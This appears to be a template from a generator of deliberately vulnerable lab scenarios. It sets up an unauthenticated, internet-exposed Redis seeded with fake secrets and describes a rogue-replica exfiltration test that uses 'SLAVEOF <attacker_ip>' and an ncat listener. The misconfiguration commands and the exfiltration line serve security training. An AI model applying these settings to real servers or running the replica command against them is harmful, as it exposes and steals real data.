---
id: redis_replication_leak
description: Configures Redis with no authentication, bound to 0.0.0.0, and protected-mode disabled, allowing an attacker-controlled host to register as a rogue replica and pull all keys from the Redis master via the replication protocol.
required_vars: []
---
# Atom: Redis Replication Leak (Rogue Replica)
Redis replication requires no authentication handshake when `requirepass` is absent and `protected-mode` is off. An attacker who can reach the Redis port can issue `SLAVEOF <attacker_ip> <attacker_port>` (or `REPLICAOF` in newer Redis), causing the victim Redis to connect back to the attacker's listener and stream all key-value data in full. This attack (sometimes called "Redis Rogue Server") leaks the entire dataset without triggering authentication.

### Logic Requirements:
1. Install Redis: `apt-get install -y redis-server`
2. Configure Redis with no authentication, all-interface binding, and protected-mode off:
   - `bind 0.0.0.0`
   - Comment out / remove `requirepass`
   - `protected-mode no`
3. Optionally pre-populate Redis with sensitive data to leak (combine with `sensitive_file` logic applied to Redis keys):
   ```bash
   redis-cli SET db_password "SensitiveSecret123"
   redis-cli SET api_key "sk-live-abc123def456"
   ```
4. Start Redis.

### Common Patterns:
- **Inline Redis Start (Docker-friendly):**
  ```bash
  redis-server --bind 0.0.0.0 --protected-mode no --daemonize yes
  redis-cli SET db_password "SensitiveSecret123"
  redis-cli SET api_key "sk-live-abc123def456"
  redis-cli SET session_token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
  ```
- **Config File Approach:**
  ```bash
  sed -i 's/^bind 127.0.0.1/bind 0.0.0.0/' /etc/redis/redis.conf
  sed -i 's/^protected-mode yes/protected-mode no/' /etc/redis/redis.conf
  sed -i '/^requirepass/d' /etc/redis/redis.conf
  service redis-server start
  redis-cli SET db_password "SensitiveSecret123"
  ```

### Testing Guidance:
1. Verify Redis is listening on 0.0.0.0:6379: `ss -tlnp | grep 6379`
2. Verify unauthenticated access: `redis-cli -h 127.0.0.1 ping` → `PONG`
3. Verify sensitive keys exist: `redis-cli -h 127.0.0.1 KEYS '*'` and `redis-cli -h 127.0.0.1 GET db_password`
4. **Rogue Replica Test (from attacker container):**
   On the attacker host, start a listener (e.g. using `redis-rogue-server` or `ncat -lvp 6380`), then:
   ```bash
   redis-cli -h <victim_ip> SLAVEOF <attacker_ip> 6380
   ```
   The victim Redis will initiate a full sync, streaming all data to the attacker.
5. Verify the `SLAVEOF` command is accepted: `redis-cli -h <victim_ip> INFO replication | grep role` — should show `role:slave`.

### Synthesis Guidance:
This atom overlaps with `redis_disable_auth` in its base configuration (no auth + bind 0.0.0.0 + protected-mode no). When both atoms are selected for a scenario, the Builder should deduplicate those setup commands and note that `redis_replication_leak` extends `redis_disable_auth` by additionally populating the keystore with sensitive data. The rogue replica attack itself is performed from the attacker container using the `attack_from_container` tool — the atom only sets up the victim-side misconfiguration. Store credentials in Redis keys that are reused elsewhere in the scenario for a realistic pivot chain.
